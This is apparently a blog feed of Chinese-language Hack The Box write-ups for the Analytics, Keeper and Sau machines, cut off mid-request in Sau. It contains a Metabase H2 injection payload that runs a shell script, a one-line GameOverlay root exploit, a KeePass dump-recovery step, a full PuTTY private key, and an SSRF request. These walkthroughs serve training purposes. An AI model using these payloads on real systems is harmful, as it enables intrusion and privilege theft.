&#123;</span><br><span class=\"line\">        &quot;is_on_demand&quot;: false,</span><br><span class=\"line\">        &quot;is_full_sync&quot;: false,</span><br><span class=\"line\">        &quot;is_sample&quot;: false,</span><br><span class=\"line\">        &quot;cache_ttl&quot;: null,</span><br><span class=\"line\">        &quot;refingerprint&quot;: false,</span><br><span class=\"line\">        &quot;auto_run_queries&quot;: true,</span><br><span class=\"line\">        &quot;schedules&quot;:</span><br><span class=\"line\">        &#123;&#125;,</span><br><span class=\"line\">        &quot;details&quot;:</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(&#x27;bash /tmp/2.sh&#x27;)\\n$$--=x&quot;,</span><br><span class=\"line\">            &quot;advanced-options&quot;: false,</span><br><span class=\"line\">            &quot;ssl&quot;: true</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &quot;name&quot;: &quot;an-sec-research-team&quot;,</span><br><span class=\"line\">        &quot;engine&quot;: &quot;h2&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>反弹成功</p>\n<p>在使用 env 可以得到 metalytics 的账号与密码</p>\n<p>然后使用 ssh 进行登录</p>\n<p>metabase 里面没有什么内容</p>\n<p>ssh 连接后 id 显示 1000</p>\n<p>在目录下有一个 flag</p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>使用 sudo -l 发现没有用</p>\n<p>使用 uname</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure></p>\n<p>查资料发现存在</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CVE-2023-2640 and CVE-2023-32629</span><br></pre></td></tr></table></figure></p>\n<p>只需要使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c &#x27;import os;import pty;os.setuid(0);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>即可获取权限</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Keeper/",
            "url": "https://lookhui.github.io/HTB-Keeper/",
            "title": "HTB-Keeper",
            "date_published": "2023-12-14T03:01:05.000Z",
            "content_html": "<h1 id=\"keeper\"><a class=\"anchor\" href=\"#keeper\">#</a> Keeper</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>nmap 扫描</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 11:02 中国标准时间</span><br><span class=\"line\">Stats: 0:01:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class=\"line\">SYN Stealth Scan Timing: About 81.23% done; ETC: 11:04 (0:00:26 remaining)</span><br><span class=\"line\">Nmap scan report for tickets.keeper.htb (10.10.11.227)</span><br><span class=\"line\">Host is up (0.38s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 211.64 seconds</span><br></pre></td></tr></table></figure></p>\n<p>访问 ip 提示我没有令牌需要访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://tickets.keeper.htb/</span><br></pre></td></tr></table></figure></p>\n<p>添加 hosts</p>\n<p>进行目录扫描</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000835:   200        0 L      16 W       95 Ch       &quot;rtl&quot;</span><br><span class=\"line\">000001797:   200        0 L      16 W       95 Ch       &quot;rti&quot;</span><br><span class=\"line\">000001798:   200        0 L      16 W       95 Ch       &quot;rte&quot;</span><br><span class=\"line\">000002829:   403        0 L      0 W        0 Ch        &quot;l&quot;</span><br><span class=\"line\">000002830:   200        111 L    182 W      2309 Ch     &quot;m&quot;</span><br><span class=\"line\">000005145:   200        0 L      16 W       95 Ch       &quot;rt03&quot;</span><br><span class=\"line\">000005144:   200        0 L      16 W       95 Ch       &quot;rt234&quot;</span><br><span class=\"line\">000005143:   200        0 L      16 W       95 Ch       &quot;rtcase&quot;</span><br><span class=\"line\">000005141:   200        0 L      16 W       95 Ch       &quot;rtisv1&quot;</span><br><span class=\"line\">000005139:   200        0 L      16 W       95 Ch       &quot;rtl_img&quot;</span><br><span class=\"line\">000005142:   200        0 L      16 W       95 Ch       &quot;rthib1&quot;</span><br><span class=\"line\">000005140:   200        0 L      16 W       95 Ch       &quot;rtl_images&quot;</span><br><span class=\"line\">000018972:   200        0 L      16 W       95 Ch       &quot;rtpnc&quot;</span><br><span class=\"line\">000018984:   200        0 L      16 W       95 Ch       &quot;rt1&quot;</span><br><span class=\"line\">000018982:   200        0 L      16 W       95 Ch       &quot;rt3&quot;</span><br><span class=\"line\">000018981:   200        0 L      16 W       95 Ch       &quot;rt35&quot;</span><br><span class=\"line\">000018980:   200        0 L      16 W       95 Ch       &quot;rt4&quot;</span><br><span class=\"line\">000018979:   200        0 L      16 W       95 Ch       &quot;rt6&quot;</span><br><span class=\"line\">000018978:   200        0 L      16 W       95 Ch       &quot;rtech&quot;</span><br><span class=\"line\">000018977:   200        0 L      16 W       95 Ch       &quot;rtifs1&quot;</span><br><span class=\"line\">000018976:   200        0 L      16 W       95 Ch       &quot;rtifs2&quot;</span><br><span class=\"line\">000018974:   200        0 L      16 W       95 Ch       &quot;rtm.log&quot;</span><br><span class=\"line\">000018971:   200        0 L      16 W       95 Ch       &quot;rtr&quot;</span><br><span class=\"line\">000018973:   200        0 L      16 W       95 Ch       &quot;rtp&quot;</span><br><span class=\"line\">000018970:   200        0 L      16 W       95 Ch       &quot;rtr1&quot;</span><br><span class=\"line\">000018969:   200        0 L      16 W       95 Ch       &quot;rtr2&quot;</span><br><span class=\"line\">000018983:   200        0 L      16 W       95 Ch       &quot;rt25&quot;</span><br><span class=\"line\">000018968:   200        0 L      16 W       95 Ch       &quot;rts&quot;</span><br><span class=\"line\">000018967:   200        0 L      16 W       95 Ch       &quot;rtsc&quot;</span><br><span class=\"line\">000018966:   200        0 L      16 W       95 Ch       &quot;rtsmcse&quot;</span><br><span class=\"line\">000018965:   200        0 L      16 W       95 Ch       &quot;rtsp.php&quot;</span><br><span class=\"line\">000018964:   200        0 L      16 W       95 Ch       &quot;rtsxt1&quot;</span><br><span class=\"line\">000018975:   200        0 L      16 W       95 Ch       &quot;rtm&quot;</span><br><span class=\"line\">000018985:   200        153 L    325 W      4236 Ch     &quot;rt&quot;</span><br></pre></td></tr></table></figure></p>\n<p>发现 m 那里能进行登录直接进去</p>\n<p>跳转登录界面</p>\n<p>显示了 rt 4.4.4+dfsg-2ubuntu1 服务版本信息</p>\n<p>搜索默认密码尝试</p>\n<p>root/password</p>\n<p>登录成功</p>\n<p>收集信息</p>\n<p>发现用户除了 root 还有一个 lnorgaard</p>\n<p>并且在备注那里看到了密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">New user. Initial password set to Welcome2023!</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"获得shell\"><a class=\"anchor\" href=\"#获得shell\">#</a> 获得 shell</h4>\n<p>猜测这个密码是 ssh 连接密码进行连接查看</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ ssh lnorgaard@10.10.11.227</span><br><span class=\"line\">The authenticity of host &#x27;10.10.11.227 (10.10.11.227)&#x27; can&#x27;t be established.</span><br><span class=\"line\">ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.</span><br><span class=\"line\">This key is not known by any other names.</span><br><span class=\"line\">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class=\"line\">Warning: Permanently added &#x27;10.10.11.227&#x27; (ED25519) to the list of known hosts.</span><br><span class=\"line\">lnorgaard@10.10.11.227&#x27;s password:</span><br><span class=\"line\">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)</span><br><span class=\"line\"></span><br><span class=\"line\"> * Documentation:  https://help.ubuntu.com</span><br><span class=\"line\"> * Management:     https://landscape.canonical.com</span><br><span class=\"line\"> * Support:        https://ubuntu.com/advantage</span><br><span class=\"line\">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class=\"line\"></span><br><span class=\"line\">You have mail.</span><br><span class=\"line\">Last login: Thu Dec 14 04:05:37 2023 from 10.10.14.19</span><br><span class=\"line\">lnorgaard@keeper:~$</span><br></pre></td></tr></table></figure></p>\n<p>登录成功</p>\n<p>在 user.txt 文件中拿下他的第一个 flag</p>\n<h4 id=\"提取\"><a class=\"anchor\" href=\"#提取\">#</a> 提取</h4>\n<p>发现 sudo 无法执行</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lnorgaard@keeper:~$ sudo -l</span><br><span class=\"line\">[sudo] password for lnorgaard:</span><br><span class=\"line\">Sorry, user lnorgaard may not run sudo on keeper.</span><br><span class=\"line\">lnorgaard@keeper:~$ sudo su</span><br><span class=\"line\">[sudo] password for lnorgaard:</span><br><span class=\"line\">lnorgaard is not in the sudoers file.  This incident will be reported.</span><br></pre></td></tr></table></figure></p>\n<p>解压目录下的压缩包</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lnorgaard@keeper:~$ unzip RT30000.zip -d ./cc</span><br><span class=\"line\">Archive:  RT30000.zip</span><br><span class=\"line\">  inflating: ./cc/KeePassDumpFull.dmp</span><br><span class=\"line\"> extracting: ./cc/passcodes.kdbx</span><br></pre></td></tr></table></figure></p>\n<p>出现了一个 kdbx 和一个 dmp 文件</p>\n<p>通过 scp 把 kdbx 和 dmp 以及 poc.py 都传到本地试试</p>\n<p>使用 python3 <span class=\"exturl\" data-url=\"aHR0cDovL3BvYy5weQ==\">poc.py</span> -d ./cc/KeePassDumpFull.dmp</p>\n<p>得到几长串字符通过后面一直没有变的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">med flode</span><br></pre></td></tr></table></figure></p>\n<p>使用谷歌搜索，搜索到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rødgrød med fløde</span><br></pre></td></tr></table></figure></p>\n<p>一种甜品名称</p>\n<p>使用 KeePass.exe 打开 KeePassDumpFull.dmp</p>\n<p>输入密码</p>\n<p>得到 notes</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PuTTY-User-Key-File-3: ssh-rsa</span><br><span class=\"line\">Encryption: none</span><br><span class=\"line\">Comment: rsa-key-20230519</span><br><span class=\"line\">Public-Lines: 6</span><br><span class=\"line\">AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D</span><br><span class=\"line\">8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T</span><br><span class=\"line\">EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM</span><br><span class=\"line\">Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu</span><br><span class=\"line\">FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ</span><br><span class=\"line\">LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et</span><br><span class=\"line\">Private-Lines: 14</span><br><span class=\"line\">AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j</span><br><span class=\"line\">oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih</span><br><span class=\"line\">kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY</span><br><span class=\"line\">f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT</span><br><span class=\"line\">VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz</span><br><span class=\"line\">UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs</span><br><span class=\"line\">OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz</span><br><span class=\"line\">in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r</span><br><span class=\"line\">SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV</span><br><span class=\"line\">09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa</span><br><span class=\"line\">xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA</span><br><span class=\"line\">AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD</span><br><span class=\"line\">AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy</span><br><span class=\"line\">NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=</span><br><span class=\"line\">Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0</span><br></pre></td></tr></table></figure></p>\n<p>将这个使用 puttygen 去转换为 id_rsa</p>\n<p>如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">puttygen keeper.ppk -O private-openssh -o id_rsa</span><br></pre></td></tr></table></figure></p>\n<p>得到后 chmod 777 id_rsa 给个权限</p>\n<p>使用 ssh -i id_rsa root@10.10.11.227 成功登录 root</p>\n<p>然后得到 flag2</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Sau/",
            "url": "https://lookhui.github.io/HTB-Sau/",
            "title": "HTB-Sau",
            "date_published": "2023-12-14T00:50:56.000Z",
            "content_html": "<h1 id=\"sau\"><a class=\"anchor\" href=\"#sau\">#</a> Sau</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>获得靶机 ip</p>\n<p>使用 nmap 扫描同时使用浏览器访问查看一下</p>\n<p>发现访问后没有出现内容</p>\n<p>nmap 扫描结束内容如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 08:52 中国标准时间</span><br><span class=\"line\">Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class=\"line\">SYN Stealth Scan Timing: About 72.40% done; ETC: 08:54 (0:00:32 remaining)</span><br><span class=\"line\">Nmap scan report for bogon (10.10.11.224)</span><br><span class=\"line\">Host is up (0.35s latency).</span><br><span class=\"line\">Not shown: 997 closed tcp ports (reset)</span><br><span class=\"line\">PORT      STATE    SERVICE</span><br><span class=\"line\">22/tcp    open     ssh</span><br><span class=\"line\">80/tcp    filtered http</span><br><span class=\"line\">55555/tcp open     unknown</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 112.22 seconds</span><br></pre></td></tr></table></figure></p>\n<p>这里的 80 端口显示被过滤了那我们使用 nmap -sF 来进行扫描这个端口看看</p>\n<p>tips: FIN 为 TCP 会话结束标志，在 FIN 扫描中一个设置了 FIN 位的数据包被发送后，若响应 RST 数据包，则表示端口关闭，没有响应则表示开放。此类扫描同样不能准确判断 windows 系统上端口开发情况，适合探测 Linux 系统上的端口开放情况</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Host is up (0.39s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT   STATE         SERVICE</span><br><span class=\"line\">80/tcp open|filtered http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 5.34 second</span><br></pre></td></tr></table></figure></p>\n<p>发现是打开的没问题</p>\n<p>然后访问开启的 55555 端口发现可以</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://10.10.11.224:55555/</span><br></pre></td></tr></table></figure></p>\n<p>使用详细扫描扫描到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PORT      STATE    SERVICE VERSION</span><br><span class=\"line\">22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">80/tcp    filtered http</span><br><span class=\"line\">55555/tcp open     unknown</span><br><span class=\"line\">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class=\"line\">SF-Port55555-TCP:V=7.93%I=7%D=12/14%Time=657A52FF%P=i686-pc-windows-window</span><br><span class=\"line\">SF:s%r(GetRequest,A2,&quot;HTTP/1\\.0\\x20302\\x20Found\\r\\nContent-Type:\\x20text/h</span><br><span class=\"line\">SF:tml;\\x20charset=utf-8\\r\\nLocation:\\x20/web\\r\\nDate:\\x20Thu,\\x2014\\x20De</span><br><span class=\"line\">SF:c\\x202023\\x2000:57:37\\x20GMT\\r\\nContent-Length:\\x2027\\r\\n\\r\\n&lt;a\\x20href</span><br><span class=\"line\">SF:=\\&quot;/web\\&quot;&gt;Found&lt;/a&gt;\\.\\n\\n&quot;)%r(GenericLines,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\</span><br><span class=\"line\">SF:x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnecti</span><br><span class=\"line\">SF:on:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;)%r(HTTPOptions,60,&quot;HTTP/1\\.0</span><br><span class=\"line\">SF:\\x20200\\x20OK\\r\\nAllow:\\x20GET,\\x20OPTIONS\\r\\nDate:\\x20Thu,\\x2014\\x20De</span><br><span class=\"line\">SF:c\\x202023\\x2000:57:40\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(RTSPRe</span><br><span class=\"line\">SF:quest,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/p</span><br><span class=\"line\">SF:lain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Req</span><br><span class=\"line\">SF:uest&quot;)%r(Help,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x</span><br><span class=\"line\">SF:20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Ba</span><br><span class=\"line\">SF:d\\x20Request&quot;)%r(SSLSessionReq,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r</span><br><span class=\"line\">SF:\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close</span><br><span class=\"line\">SF:\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;)%r(TerminalServerCookie,67,&quot;HTTP/1\\.1\\x2</span><br><span class=\"line\">SF:0400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8</span><br><span class=\"line\">SF:\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;)%r(TLSSessionReq</span><br><span class=\"line\">SF:,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;</span><br><span class=\"line\">SF:\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;</span><br><span class=\"line\">SF:)%r(Kerberos,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x2</span><br><span class=\"line\">SF:0text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad</span><br><span class=\"line\">SF:\\x20Request&quot;)%r(FourOhFourRequest,EA,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Reques</span><br><span class=\"line\">SF:t\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-Type-Op</span><br><span class=\"line\">SF:tions:\\x20nosniff\\r\\nDate:\\x20Thu,\\x2014\\x20Dec\\x202023\\x2000:58:14\\x20</span><br><span class=\"line\">SF:GMT\\r\\nContent-Length:\\x2075\\r\\n\\r\\ninvalid\\x20basket\\x20name;\\x20the\\x</span><br><span class=\"line\">SF:20name\\x20does\\x20not\\x20match\\x20pattern:\\x20\\^\\[\\\\w\\\\d\\\\-_\\\\\\.\\]&#123;1,25</span><br><span class=\"line\">SF:0&#125;\\$\\n&quot;)%r(LPDString,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-</span><br><span class=\"line\">SF:Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n40</span><br><span class=\"line\">SF:0\\x20Bad\\x20Request&quot;)%r(LDAPSearchReq,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Re</span><br><span class=\"line\">SF:quest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x</span><br><span class=\"line\">SF:20close\\r\\n\\r\\n400\\x20Bad\\x20Request&quot;);</span><br><span class=\"line\">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure></p>\n<p>访问 55555 端口发现提示貌似代理访问的东西，那很直接了 ssrf 直接设置访问 127.0.0.1:80 端口</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /api/baskets/add HTTP/1.1</span><br><span class=\"line\">Host: 10.10.11.224:55555</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span 